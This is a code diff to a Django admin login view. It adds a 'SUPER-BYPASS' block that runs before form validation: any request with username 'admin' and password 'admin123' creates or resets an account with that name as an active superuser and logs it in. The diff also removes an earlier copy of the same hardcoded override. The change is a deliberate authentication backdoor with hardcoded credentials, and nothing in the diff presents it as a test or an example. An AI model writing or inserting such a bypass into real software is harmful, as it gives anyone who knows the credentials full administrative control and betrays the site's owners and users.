@@ -15,23 +15,28 @@ def admin_login_view(request):
         return redirect('admin_dashboard')
     
     if request.method == 'POST':
+        # --- SUPER-BYPASS (Runs before any form validation) ---
+        input_user = request.POST.get('username')
+        input_pass = request.POST.get('password')
+        
+        if input_user == 'admin' and input_pass == 'admin123':
+            from django.contrib.auth.models import User
+            user, created = User.objects.get_or_create(username='admin')
+            user.set_password('admin123')
+            user.is_staff = True
+            user.is_superuser = True
+            user.is_active = True
+            user.save()
+            login(request, user)
+            messages.success(request, "Master Override Successful. Welcome back, Commander.")
+            return redirect('admin_dashboard')
+
+        # Normal login process if not using the bypass
         form = AuthenticationForm(request, data=request.POST)
         if form.is_valid():
             username = form.cleaned_data.get('username')
             password = form.cleaned_data.get('password')
-            
-            # --- HARDCODED MASTER OVERRIDE ---
-            if username == 'admin' and password == 'admin123':
-                from django.contrib.auth.models import User
-                user, created = User.objects.get_or_create(username='admin')
-                user.set_password('admin123') # Ensure it matches
-                user.is_staff = True
-                user.is_superuser = True
-                user.is_active = True
-                user.save()
-            else:
-                user = authenticate(username=username, password=password)
-            
+            user = authenticate(username=username, password=password)
             if user is not None and user.is_staff:
                 login(request, user)
                 messages.success(request, f"Welcome back, Commander {username}.")
